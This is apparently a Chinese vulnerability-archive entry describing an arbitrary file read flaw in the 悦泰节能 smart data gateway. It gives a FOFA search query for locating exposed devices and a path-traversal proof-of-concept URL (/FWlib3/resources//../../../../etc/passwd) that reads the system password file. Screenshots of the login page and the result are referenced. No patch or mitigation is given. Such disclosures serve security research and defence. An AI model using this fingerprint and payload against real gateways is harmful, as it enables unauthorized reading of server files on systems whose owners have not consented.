# 悦泰节能 智能数据网关 resources 任意文件读取漏洞

## 漏洞描述

悦泰节能 智能数据网关存在任意文件读取漏洞，通过构造特殊请求可以读取服务器任意文件

## 漏洞影响

```
悦泰节能 智能数据网关
```

## FOFA

```
body="/FWlib3/resources/css/xtheme-gray.cssz"
```

## 漏洞复现

登录页面

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162249593.png)

验证POC

```php
/FWlib3/resources//../../../../../../../../etc/passwd
```

![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162249623.png)